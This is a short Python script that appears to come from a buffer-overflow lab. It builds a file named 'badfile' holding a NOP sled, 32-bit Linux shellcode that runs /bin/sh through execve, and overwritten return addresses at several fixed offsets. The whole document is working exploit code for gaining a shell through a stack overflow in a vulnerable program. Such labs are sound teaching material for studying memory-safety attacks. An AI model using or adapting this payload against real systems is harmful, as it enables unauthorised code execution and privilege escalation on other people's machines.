import sys

shellcode= ( 
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1')

length = 500
content = bytearray(0x90 for i in range(length))
start = length - len(shellcode)
content[start:] = shellcode

ret = 0xffffd298 - 1000
print(format(ret, '#x'))
content[159:163] = (ret).to_bytes(4, byteorder='little')

ret = 0xffffd298 - 1000
print(format(ret, '#x'))
content[108:112] = (ret).to_bytes(4, byteorder='little')

ret = 0xffffd298 - 1000
print(format(ret, '#x'))
content[83:87] = (ret).to_bytes(4, byteorder='little')

for i in range(len(content)):
	if (content[i] == 0x00):
		print('zero', i, content[i])

with open('badfile', 'wb') as f:
    f.write(content)